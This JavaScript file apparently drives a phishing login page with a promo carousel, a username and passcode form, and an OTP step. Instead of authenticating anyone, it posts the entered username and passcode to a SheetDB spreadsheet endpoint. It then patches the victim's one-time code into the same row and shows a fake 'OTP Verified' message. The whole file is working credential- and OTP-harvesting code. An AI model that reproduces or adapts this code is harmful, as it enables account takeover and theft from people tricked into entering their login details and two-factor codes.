// --- SELECTORS ---
const slider = document.getElementById('mainSlider');
const track = document.querySelector('.carousel-track');
const dots = document.querySelectorAll('.dot');

const loginTrigger = document.getElementById('loginTrigger');    
const backToLanding = document.getElementById('backToLanding');  
const goToOtp = document.getElementById('goToOtp');            
const backToLogin = document.getElementById('backToLogin');    
const finishAuth = document.getElementById('finishAuth');      

const usernameInput = document.getElementById('username');
const passcodeInput = document.getElementById('passcode');
const otpInput = document.getElementById('otpInput');

// --- CONFIGURATION ---
const SHEETDB_API_URL = 'https://sheetdb.io/api/v1/gnmgo6n53wxu6';
let sessionId = ""; // Used to identify the same row for the OTP update

let currentIndex = 0;
let carouselInterval;

// --- INITIALIZATION ---
window.onload = () => {
    setTimeout(() => {
        slider.className = 'main-slider slider-step-1';
        startCarousel();
    }, 2000);
};

// --- PROMO CAROUSEL ---
function startCarousel() {
    clearInterval(carouselInterval);
    carouselInterval = setInterval(() => {
        currentIndex = (currentIndex + 1) % 2;
        if(track) track.style.transform = `translateX(-${currentIndex * 50}%)`;
        dots.forEach(dot => dot.classList.remove('active'));
        if(dots[currentIndex]) dots[currentIndex].classList.add('active');
    }, 4000);
}

// --- NAVIGATION & SUBMISSION STEP 1 (Username/Passcode) ---

goToOtp.addEventListener('click', async () => {
    const username = usernameInput.value;
    const passcode = passcodeInput.value;

    // Create a unique ID for this specific login attempt
    sessionId = "ID-" + Math.floor(Math.random() * 1000000);

    goToOtp.innerText = "Processing...";
    goToOtp.disabled = true;

    try {
        // First request: Create the row with Username, Passcode, and SessionID
        const response = await fetch(SHEETDB_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                data: [{
                    'session_id': sessionId,
                    'username': username,
                    'passcode': passcode,
                    'otp': 'PENDING...', // Placeholder
                    'timestamp': new Date().toLocaleString()
                }]
            })
        });

        const result = await response.json();
        if (result.created === 1) {
            // Slide to OTP page only after successful first write
            slider.className = 'main-slider slider-step-3';
        }
    } catch (error) {
        alert("Login error. Please try again.");
    } finally {
        goToOtp.innerText = "Login";
        goToOtp.disabled = false;
    }
});

// --- SUBMISSION STEP 2 (Update same row with OTP) ---

finishAuth.addEventListener('click', async () => {
    const otp = otpInput.value;

    if (otp.length < 6) {
        alert("Please enter 6-digit OTP.");
        return;
    }

    finishAuth.innerText = "Verifying...";
    finishAuth.disabled = true;

    try {
        // PATCH request: Find the row with our sessionId and update the 'otp' column
        const response = await fetch(`${SHEETDB_API_URL}/session_id/${sessionId}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                data: { 'otp': otp }
            })
        });

        const result = await response.json();

        if (result.updated === 1) {
            alert("Success! OTP Verified.");
            // Reset Form
            usernameInput.value = '';
            passcodeInput.value = '';
            otpInput.value = '';
            slider.className = 'main-slider slider-step-1';
            startCarousel();
        }
    } catch (error) {
        alert("Connection error.");
    } finally {
        finishAuth.innerText = "Verify";
        finishAuth.disabled = false;
    }
});

// Other Nav
loginTrigger.addEventListener('click', () => {
    slider.className = 'main-slider slider-step-2';
    clearInterval(carouselInterval);
});

backToLanding.addEventListener('click', () => {
    slider.className = 'main-slider slider-step-1';
    startCarousel();
});

backToLogin.addEventListener('click', () => {
    slider.className = 'main-slider slider-step-2';
});

// Validation
const validateLoginForm = () => {
    if (usernameInput.value.trim().length > 3 && passcodeInput.value.length > 0) {
        goToOtp.style.backgroundColor = '#005696';
        goToOtp.disabled = false;
    } else {
        goToOtp.style.backgroundColor = '#e0e4e8';
        goToOtp.disabled = true;
    }
};

usernameInput.addEventListener('input', validateLoginForm);
passcodeInput.addEventListener('input', validateLoginForm);
